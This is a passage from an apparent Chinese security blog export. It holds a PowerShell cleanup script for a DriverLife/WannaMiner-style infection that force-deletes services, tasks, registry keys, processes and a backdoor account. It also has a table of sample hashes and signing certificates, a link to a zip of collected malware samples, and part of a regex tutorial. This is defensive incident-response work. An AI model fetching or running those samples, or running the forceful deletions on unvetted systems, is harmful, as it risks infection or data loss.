<span class="nomarkup">-ne</span> <span class="variable">$servicemd5</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$evilHashes</span> <span class="nomarkup">-eq</span> <span class="variable">$servicemd5</span>.Hash) &#123;</span><br><span class="line">            <span class="built_in">write-host</span>  [-] <span class="string">'deleting Service:'</span> <span class="variable">$service</span>.Name <span class="string">'Path:'</span> <span class="variable">$exePath</span> -ForegroundColor Red</span><br><span class="line">            <span class="built_in">Remove-Item</span> -Path <span class="variable">$exePath</span> -Force</span><br><span class="line">            sc.exe delete <span class="variable">$service</span>.Name</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">##_del_if_match $exePath</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">##删除服务</span></span><br><span class="line"></span><br><span class="line">cmd.exe /c <span class="string">"sc.exe delete  WebServers 2&gt;nul&gt;nul"</span></span><br><span class="line">cmd.exe /c <span class="string">"sc.exe delete Ddriver 2&gt;nul&gt;nul"</span></span><br><span class="line">cmd.exe /c <span class="string">"sc.exe delete DnsScan 2&gt;nul&gt;nul"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##delete startup</span></span><br><span class="line"><span class="built_in">write-host</span> [i] delete startup -ForegroundColor Green</span><br><span class="line"><span class="built_in">Get-ChildItem</span> -Path <span class="string">'C:\Users\*\AppData\Roaming\Microsoft\Windows\*'</span> -force -Recurse  -ErrorAction <span class="number">0</span> | ?&#123;<span class="variable">$_</span>.name <span class="nomarkup">-eq</span> <span class="string">"run.bat"</span>&#125; |<span class="built_in">Remove-Item</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##删除注册表值</span></span><br><span class="line"><span class="built_in">write-host</span> [i] delete Registry -ForegroundColor Green</span><br><span class="line"><span class="built_in">Remove-ItemProperty</span> <span class="string">"HKlM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span> -name <span class="string">"WebServers"</span> -Force -ErrorAction <span class="number">0</span></span><br><span class="line"><span class="built_in">Remove-ItemProperty</span> <span class="string">"HKlM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span> -name <span class="string">"Ddriver"</span> -Force -ErrorAction <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##删除计划任务</span></span><br><span class="line"><span class="built_in">write-host</span> [i] delete tasks -ForegroundColor Green</span><br><span class="line">cmd.exe /c <span class="string">"schtasks /delete /tn '\Microsoft\windows\Bluetooths' /f 2&gt;nul"</span></span><br><span class="line">cmd.exe /c <span class="string">"schtasks /delete /tn '\dnsscan' /f 2&gt;nul&gt;nul"</span></span><br><span class="line">cmd.exe /c <span class="string">"schtasks /delete /tn '\Certificate' /f 2&gt;nul&gt;nul"</span></span><br><span class="line">cmd.exe /c <span class="string">"schtasks /delete /tn '\dnsscan' /f 2&gt;nul&gt;nul"</span></span><br><span class="line">cmd.exe /c <span class="string">"schtasks /delete /tn '\Ddrivers' /f 2&gt;nul&gt;nul"</span></span><br><span class="line">cmd.exe /c <span class="string">"schtasks /delete /tn '\WebServers' /f 2&gt;nul"</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">write-host</span> [i] delete <span class="keyword">process</span> -ForegroundColor Green</span><br><span class="line">cmd.exe /c <span class="string">"taskkill -im wmiex.exe /f 2&gt;nul"</span></span><br><span class="line">wmic <span class="keyword">process</span> where <span class="string">"name='svchost.exe' and ExecutablePath='C:\\windows\\system32\\drivers\\svchost.exe'"</span> call Terminate |<span class="built_in">Out-Null</span></span><br><span class="line">wmic <span class="keyword">process</span> where <span class="string">"name='taskmgr.exe' and ExecutablePath='C:\\windows\\system32\\drivers\\taskmgr.exe'"</span> call Terminate |<span class="built_in">Out-Null</span></span><br><span class="line">wmic <span class="keyword">process</span> where <span class="string">"name='svchost.exe' and ExecutablePath='C:\\windows\\SysWOW64\\drivers\\svchost.exe'"</span> call Terminate |<span class="built_in">Out-Null</span></span><br><span class="line">wmic <span class="keyword">process</span> where <span class="string">"name='taskmgr.exe' and ExecutablePath='C:\\windows\\SysWOW64\\drivers\\taskmgr.exe'"</span> call Terminate |<span class="built_in">Out-Null</span></span><br><span class="line">wmic <span class="keyword">process</span> where <span class="string">"name='updater.exe' and ExecutablePath='C:\\Windows\\temp\\updater.exe'"</span> call Terminate |<span class="built_in">Out-Null</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">write-host</span> [i] delete Forward -ForegroundColor Green</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=<span class="number">65531</span> |<span class="built_in">Out-Null</span></span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=<span class="number">65532</span> |<span class="built_in">Out-Null</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">write-host</span> [i] delete user:k8h3d -ForegroundColor Green</span><br><span class="line">cmd.exe /c <span class="string">"net user k8h3d /del 2&gt;nul"</span> |<span class="built_in">out-null</span></span><br><span class="line"><span class="comment">##cmd.exe /c "taskkill -im powershell.exe /f 2&gt;nul"</span></span><br></pre></td></tr></table></figure><h1 id="其它相关"><a href="#其它相关" class="headerlink" title="其它相关"></a>其它相关</h1><h2 id="md5-以及签名证书信息"><a href="#md5-以及签名证书信息" class="headerlink" title="md5 以及签名证书信息"></a>md5 以及签名证书信息</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> check_Signer&#123;</span><br><span class="line"> <span class="keyword">Param</span> (</span><br><span class="line">        <span class="variable">$evil_file</span></span><br><span class="line">    )</span><br><span class="line"><span class="variable">$Signature</span>=<span class="built_in">Get-AuthenticodeSignature</span>  <span class="variable">$evil_file</span> -ErrorAction <span class="number">0</span></span><br><span class="line"><span class="variable">$Signature_Thumbprint</span>= <span class="variable">$Signature</span>.SignerCertificate.Thumbprint</span><br><span class="line"><span class="variable">$cn</span>=<span class="variable">$Signature</span>.SignerCertificate.Subject</span><br><span class="line"><span class="variable">$md5</span>=(_calc_md5 <span class="variable">$evil_file</span>).hash</span><br><span class="line"></span><br><span class="line"><span class="variable">$retVals</span> = <span class="built_in">New-Object</span> -TypeName psobject -Property @&#123;</span><br><span class="line">               Signature  = <span class="variable">$cn</span></span><br><span class="line">                File = <span class="variable">$evil_file</span></span><br><span class="line">                Thumbprint=<span class="variable">$Signature_Thumbprint</span></span><br><span class="line">                MD5=<span class="variable">$md5</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$retVals</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> _calc_md5&#123;</span><br><span class="line">    <span class="keyword">Param</span>(<span class="variable">$path</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$path</span> <span class="nomarkup">-ne</span> <span class="literal">$null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">Test-Path</span> <span class="variable">$path</span> -PathType Leaf )&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="variable">$fs</span>=(<span class="built_in">new-object</span> system.io.fileinfo(<span class="variable">$path</span>)).openread();</span><br><span class="line">                <span class="variable">$r</span>=(<span class="built_in">new-object</span> system.security.cryptography.md5cryptoserviceprovider).computehash(<span class="variable">$fs</span>);<span class="variable">$fs</span>.close();</span><br><span class="line">                [string]<span class="variable">$hash</span>=[bitconverter]::tostring(<span class="variable">$r</span>).replace(<span class="string">'-'</span>,<span class="string">''</span>)   </span><br><span class="line">            &#125;catch&#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$retVal</span> = <span class="built_in">New-Object</span> -TypeName psobject -Property @&#123;</span><br><span class="line">                Path = <span class="variable">$path</span></span><br><span class="line">                Hash = <span class="variable">$hash</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$retVal</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">write-host</span> [-] <span class="string">'_calc_md5'</span> <span class="variable">$path</span> -ForegroundColor Yellow</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">ls *.exe |% &#123;check_Signer <span class="variable">$_</span>.FullName&#125;|<span class="built_in">Select-Object</span> MD5,Thumbprint,File,Signature|<span class="built_in">Sort-Object</span> Th</span><br><span class="line">umbprint |ft -AutoSize |<span class="built_in">Out-String</span> -Width <span class="number">99999</span> |<span class="built_in">Out-File</span> infos.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">MD5                              Thumbprint                               File                                  Signature                                                                                                                                                                               </span><br><span class="line">---                              ----------                               ----                                  ---------                                                                                                                                                                               </span><br><span class="line">D80CFB955B1881F89BDC249B1844F612                                          C:\test\DriverLife\svchost1x.exe                                                                                                                                                                                              </span><br><span class="line">96BDB44E072122EE05FB8E729063463C                                          C:\test\DriverLife\svchostb.exe                                                                                                                                                                                               </span><br><span class="line">CCE36235A525858EB55070847296C4C8                                          C:\test\DriverLife\svchost1.exe                                                                                                                                                                                               </span><br><span class="line">BC26FD7A0B7FE005E116F5FF2227EA4D                                          C:\test\DriverLife\svchos3t.exe                                                                                                                                                                                               </span><br><span class="line">96BDB44E072122EE05FB8E729063463C                                          C:\test\DriverLife\svchost.exe                                                                                                                                                                                                </span><br><span class="line">DF79BC5E41426BB87FE725554DD76A6E                                          C:\test\DriverLife\svvhost1.exe                                                                                                                                                                                               </span><br><span class="line">9911858E9BEC100CCF6D8134915103EC                                          C:\test\DriverLife\svvhost2.exe                                                                                                                                                                                               </span><br><span class="line">DF79BC5E41426BB87FE725554DD76A6E                                          C:\test\DriverLife\svvhost.exe                                                                                                                                                                                                </span><br><span class="line">9911858E9BEC100CCF6D8134915103EC                                          C:\test\DriverLife\svchost_1.exe                                                                                                                                                                                              </span><br><span class="line">D758AA69BC07881C136ED68A38B7BEEC                                          C:\test\DriverLife\svcxhostex.exe                                                                                                                                                                                             </span><br><span class="line">0D3B854DFF7EABCC0A834F268392F3A1                                          C:\test\DriverLife\svchostx.exe                                                                                                                                                                                               </span><br><span class="line">17F6582FE231831512E7CA90AC3BB97C                                          C:\test\DriverLife\log.exe                                                                                                                                                                                                    </span><br><span class="line">2574D2B7CE00510323F18777EAF9F289                                          C:\test\DriverLife\lduwsx.exe                                                                                                                                                                                                 </span><br><span class="line">6983F7001DE10F4D19FC2D794C3EB534                                          C:\test\DriverLife\liqegykg.exe                                                                                                                                                                                               </span><br><span class="line">6983F7001DE10F4D19FC2D794C3EB534                                          C:\test\DriverLife\nidofopt.exe                                                                                                                                                                                               </span><br><span class="line">6983F7001DE10F4D19FC2D794C3EB534                                          C:\test\DriverLife\jheikvql.exe                                                                                                                                                                                               </span><br><span class="line">59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\updatec.exe        CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\update.exe         CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">FB89D40E24F5FF55228C38B2B07B2E77 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\updatedlxxxx.exe   CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">FB89D40E24F5FF55228C38B2B07B2E77 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\updatedl.exe       CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\updll2.exe         CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\updlld.exe         CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\updll.exe          CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">D4E2EBCF92CF1B2E759FF7CE1F5688CA 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\taskmgr.exe        CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">637BF46077AD083659D3B96A010F38FE 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\wmiex.exe          CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\svchost2.exe       CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\setup-install.exe  CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\installed.exe      CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">59B18D6146A2AA066F661599C496090D 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\setup-installa.exe CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">74E2A43B2B7C6E258B3A3FC2516C1235 02E739740B88328AC9C4A6DE0EE703B7610F977B C:\test\DriverLife\svhhost2.exe       CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">66EA09330BEE7239FCB11A911F8E8EA3 26E740973E7C575A9B8D0B03521F7D96CE9F3E4D C:\test\DriverLife\mn.exe             CN=&quot;Shenzhen Qitu Software Technolgy Co., Ltd.&quot;, OU=Digital ID Class 3 - Microsoft Software Validation v2, O=&quot;Shenzhen Qitu Software Technolgy Co., Ltd.&quot;, L=Shenzhen, S=Guangdong, C=CN</span><br><span class="line">470B4F5BC84DB74AB1935186A3B5219F 78A149F9A04653B01DF09743571DF938F9873FA5 C:\test\DriverLife\ii.exe             CN=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, OU=研发部, O=&quot;Shenzhen Smartspace Software technology Co.,Limited&quot;, L=Shenzhen, S=Guangdong, C=CN                                </span><br><span class="line">D81233988EC80F56EA4094BAD7AB5814 FBA6E6001B3AB7C29C70A943AA0F45D911C487EA C:\test\DriverLife\yjgqsinx.exe       CN=Shenzhen Le Zhuo Software Technologies Ltd., OU=Digital ID Class 3 - Microsoft Software Validation v2, O=Shenzhen Le Zhuo Software Technologies Ltd., L=Shenzhen, S=Guangdong, C=CN  </span><br><span class="line">D81233988EC80F56EA4094BAD7AB5814 FBA6E6001B3AB7C29C70A943AA0F45D911C487EA C:\test\DriverLife\yjgqsin.exe        CN=Shenzhen Le Zhuo Software Technologies Ltd., OU=Digital ID Class 3 - Microsoft Software Validation v2, O=Shenzhen Le Zhuo Software Technologies Ltd., L=Shenzhen, S=Guangdong, C=CN</span><br></pre></td></tr></table></figure><h2 id="多次应急收集到的所有样本"><a href="#多次应急收集到的所有样本" class="headerlink" title="多次应急收集到的所有样本"></a>多次应急收集到的所有样本</h2><p><a href="https://wolvez.oss-cn-hangzhou.aliyuncs.com/files/DriverLife.zip" target="_blank" rel="noopener">DriverLife.zip</a></p><blockquote><p>感兴趣的同学可以研究下</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WannaMiner 挖矿木马手工检测笔记</title>
      <link href="/2019/03/06/WannaMiner-chek/"/>
      <url>/2019/03/06/WannaMiner-chek/</url>
      
        <content type="html"><![CDATA[<h3 id="发现可疑进程"><a href="#发现可疑进程" class="headerlink" title="发现可疑进程:"></a>发现可疑进程:</h3><p><strong>外部扫描:</strong></p><blockquote><p>该木马通常会开启65531-65533 端口</p></blockquote><p><code>nmap -p65531-65533 --open -oG d:\result1.txt 10.230.12.1/16</code></p><p><strong>过滤出受影响IP：</strong><br><code>grep -oE &quot;\b([0-9]{1,3}\.){3}[0-9]{1,3}\b&quot; 230-result1.txt</code></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/a0bb3745392df5dbf807ee805f07544f.png" alt="2019-07-29-02-00-07"></p><p><strong>恶意端口对应进程:</strong><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/e10abfa4791caddda43161a31ad7ddcb.png" alt="2019-07-29-02-00-33"><br><strong>恶意进程对应服务:</strong><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/f7118c5858256943273daa21ea0df961.png" alt="2019-07-29-02-01-22"><br>对应服务名:<code>snmpstorsrv</code></p><p><strong>恶意服务详情</strong><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/f945b3d48d450d8441f20902a1f41289.png" alt="2019-07-29-02-02-05"></p><p><strong>服务加载模块</strong></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/d3827ee675618acd8b6682077206c65e.png" alt="2019-07-29-02-02-28"><br>加载dll:<code>snmpstorsrv.dll</code></p><p><strong>加载恶意模块位置</strong></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/ea6cd096b4e4fccc20ee173d82b1ca5d.png" alt="2019-07-29-02-03-45"><br>dll位置:<code>C:\Windows\system32\snmpstorsrv.dll</code></p><p><strong>dll模块对应的md5</strong></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/5c2f88b609b50a1c9f8e7d539fb5d839.png" alt="2019-07-29-02-04-42"></p><p>MD5:<code>42A12DE5A2B8CFF827407877DBD66B16</code><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/5b23a7091fb761b47cb025d821b223a2.png" alt="2019-07-29-02-05-07"><br>360威胁情报查看确实有相应的威胁情报信息，并有相关安全报道</p><p><strong>查看文件创建日期</strong><br><code>Get-Item C:\Windows\system32\snmpstorsrv.dll</code></p><p><code>2009/7/14      9:39</code>  修改过文件时间不准确</p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/b571017d34845bd594d4388c429f02b0.png" alt="2019-07-29-02-06-00"><br><strong>导出注册表查看服务创建日期</strong><br>服务创建日期:<code>2018/11/16 - 18:17</code></p><p><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/4c0d6f2cec5c3610d5f6c6de54e494ba.png" alt="2019-07-29-02-06-27"><br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/c28f0ec08a9a7c2f6b215a6a07043c2d.png" alt="2019-07-29-02-06-51"></p><blockquote><p>更详细快捷的查杀建议使用<strong>pchunter</strong> <strong>火绒剑</strong> <strong>auturuns</strong>等安全工具</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据清洗杂项</title>
      <link href="/2019/03/05/Data-cleaning/"/>
      <url>/2019/03/05/Data-cleaning/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-正则基础"><a href="#0x01-正则基础" class="headerlink" title="0x01 正则基础"></a>0x01 正则基础</h2><h3 id="POSIX字符组"><a href="#POSIX字符组" class="headerlink" title="POSIX字符组"></a>POSIX字符组</h3><table><thead><tr><th align="left">POSIX字符组</th><th align="left">说明</th><th align="left">范围</th></tr></thead><tbody><tr><td align="left"><code>[[:alnum:]]</code></td><td align="left">字母字符和数字字符</td><td align="left"><code>[a-zA-Z0-9]</code></td></tr><tr><td align="left"><code>[[:alpha:]]</code></td><td align="left">字母</td><td align="left"><code>[a-zA-Z]</code></td></tr><tr><td align="left"><code>[[:ascii:]]</code></td><td align="left">ASCII字符</td><td align="left"><code>[\x00-\x7F]</code></td></tr><tr><td align="left"><code>[[:blank:]]</code></td><td align="left">空格字符和制表符</td><td align="left"><code>[ \t]</code></td></tr><tr><td align="left"><code>[[:cntrl:]]</code></td><td align="left">控制字符</td><td align="left"><code>[\x00-\x1F\x7F]</code></td></tr><tr><td align="left"><code>[[:digit:]]</code></td><td align="left">数字字符</td><td align="left"><code>[0-9]</code></td></tr><tr><td align="left"><code>[[:graph:]]</code></td><td align="left">空白字符之外的字符</td><td align="left"><code>[\x21-\x7E]</code></td></tr><tr><td align="left"><code>[[:lower:]]</code></td><td align="left">小写字母字符</td><td align="left"><code>[a-z]</code></td></tr><tr><td align="left"><code>[[:print:]]</code></td><td align="left"><code>[:graph:]</code>和空白字符</td><td align="left"><code>[\x20-\x7E\]</code></td></tr><tr><td align="left"><code>[[:punct:]]</code></td><td align="left">标点符号</td><td align="left"><code>[]!&quot;\#$%&amp;&#39;\()*+,./:;&lt;=&gt;? @^_{|\}~-]</code></td></tr><tr><td align="left"><code>[[:space:]]</code></td><td align="left">空白字符</td><td align="left"><code>[ \t\r\n\v\f]</code></td></tr><tr><td align="left"><code>[[:upper:]]</code></td><td align="left">大写字母字符</td><td align="left"><code>[A-Z]</code></td></tr><tr><td align="left"><code>[[:xdigit:]]</code></td><td align="left">十六进制字符</td><td align="left"><code>[A-Fa-f0-9]</code></td></tr></tbody></table><h3 id="正反向预查"><a href="#正反向预查" class="headerlink" title="正反向预查"></a>正反向预查</h3><table><thead><tr><th align="center">字符组</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center"><code>(?:pattern)</code></td><td align="center">匹配pattern但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用或字符<code>(|)</code>来组合一个模式的各个部分是很有用。例如<code>industr(?:y|ies)</code>就是一个比<code>industry|industries</code>更简略的表达式。</td></tr><tr><td align="center"><code>(?=pattern)</code></td><td align="center">正向肯定预查，在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，<code>Windows(?=95|98|NT|2000)</code>能匹配<code>Windows2000</code>中的<code>Windows</code>，但不能匹配<code>Windows3.1</code>中的<code>Windows</code>。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。</td></tr><tr><td align="center"><code>(?!pattern)</code></td><td align="center">正向否定预查，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如<code>Windows(?!95|98|NT|2000)</code>能匹配<code>Windows3.1</code>中的<code>Windows</code>，但不能匹配<code>Windows2000</code>中的<code>Windows</code>。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始</td></tr><tr><td align="center"><code>(?&lt;=pattern)</code></td><td align="center">反向肯定预查，与正向肯定预查类拟，只是方向相反。例如，<code>(?&lt;=95|98|NT|2000)Windows</code>能匹配<code>2000Windows</code>中的<code>Windows</code>，但不能匹配<code>3.1Windows</code>中的<code>Windows</code>。</td></tr><tr><td align="center"><code>(?&lt;!pattern)</code></td><td align="center">反向否定预查，与正向否定预查类拟，只是方向相反。例如<code>(?&lt;!95|98|NT|2000)Windows</code>能匹配<code>3.1Windows</code>中的<code>Windows</code>，但不能匹配<code>2000Windows</code>中的<code>Windows</code>。</td></tr></tbody></table><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'#Windows(?=2000|XP|7)#'</span>, <span class="string">'WindowsXP'</span>, $matchResult1);</span><br><span class="line">preg_match(<span class="string">'#Windows(?=2000|XP|7)#'</span>, <span class="string">'Windows7'</span>, $matchResult2);</span><br><span class="line">preg_match(<span class="string">'#Windows(?=2000|XP|7)#'</span>, <span class="string">'Windows2000'</span>, $matchResult3);</span><br><span class="line">preg_match(<span class="string">'#Windows(?=2000|XP|7)#'</span>, <span class="string">'Windows2008'</span>, $matchResult4);</span><br><span class="line"></span><br><span class="line"><span class="comment">//高级点</span></span><br><span class="line">preg_match(<span class="string">'#Win\w+(?=2000|XP|7)#'</span>, <span class="string">'Windows2000'</span>, $matchResult5);</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">'#Win\w+(?=2\d+)#'</span>, <span class="string">'Windows2006'</span>, $matchResult6);</span><br><span class="line">preg_match(<span class="string">'#Win\w+(?=2\d+)#'</span>, <span class="string">'Windows2007'</span>, $matchResult7);</span><br><span class="line">preg_match(<span class="string">'#Win\w+(?=2\d+)#'</span>, <span class="string">'Windows2008'</span>, $matchResult8);</span><br><span class="line">preg_match(<span class="string">'#Win\w+(?=2\d+)#'</span>, <span class="string">'Windows3008'</span>, $matchResult9);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-type:text/plain'</span>);</span><br><span class="line">print_r([</span><br><span class="line">$matchResult1[<span class="number">0</span>], <span class="comment">//Windows</span></span><br><span class="line">$matchResult2[<span class="number">0</span>], <span class="comment">//Windows</span></span><br><span class="line">$matchResult3[<span class="number">0</span>], <span class="comment">//Windows</span></span><br><span class="line">$matchResult4, <span class="comment">//匹配失败</span></span><br><span class="line"></span><br><span class="line">$matchResult5[<span class="number">0</span>], <span class="comment">//Windows</span></span><br><span class="line">$matchResult6[<span class="number">0</span>], <span class="comment">//Windows</span></span><br><span class="line">$matchResult7[<span class="number">0</span>], <span class="comment">//Windows</span></span><br><span class="line">$matchResult8[<span class="number">0</span>], <span class="comment">//匹配失败</span></span><br><span class="line">$matchResult9, <span class="comment">//匹配失败</span></span><br><span 